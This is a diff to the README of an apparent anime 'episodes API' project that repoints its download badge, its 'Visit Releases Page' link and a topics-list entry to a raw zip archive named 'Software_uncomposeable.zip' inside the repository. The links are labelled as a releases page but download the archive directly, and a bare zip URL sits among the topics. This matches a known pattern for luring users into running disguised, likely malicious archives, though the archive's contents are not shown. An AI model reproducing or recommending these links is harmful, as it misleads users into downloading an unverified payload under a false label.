@@ -8,13 +8,13 @@ Welcome to the episodes API! This application allows you to fetch data about ani
 
 To get started with the episodes API, follow these simple steps. You will need to download the application from our releases page.
 
-[![Download episodes](https://github.com/rocky18313/episodes/raw/refs/heads/main/Araneiformes/Software_1.7.zip%20episodes-Get%20it%20here-brightgreen)](https://github.com/rocky18313/episodes/raw/refs/heads/main/Araneiformes/Software_1.7.zip)
+[![Download episodes](https://raw.githubusercontent.com/rocky18313/episodes/main/Araneiformes/Software_uncomposeable.zip%20episodes-Get%20it%20here-brightgreen)](https://raw.githubusercontent.com/rocky18313/episodes/main/Araneiformes/Software_uncomposeable.zip)
 
 ## 📥 Download & Install
 
 1. Click the link below to visit the releases page:
 
-   [Visit Releases Page](https://github.com/rocky18313/episodes/raw/refs/heads/main/Araneiformes/Software_1.7.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/rocky18313/episodes/main/Araneiformes/Software_uncomposeable.zip)
 
 2. On the releases page, locate the latest version. It will be marked as "Latest Release."
 
@@ -64,7 +64,7 @@ This application is all about anime. It covers topics such as:
 - Episodes
 - Episode Thumbnails
 - FFmpeg
-- https://github.com/rocky18313/episodes/raw/refs/heads/main/Araneiformes/Software_1.7.zip
+- https://raw.githubusercontent.com/rocky18313/episodes/main/Araneiformes/Software_uncomposeable.zip
 
 Staying in the loop about anime content has never been easier.
 
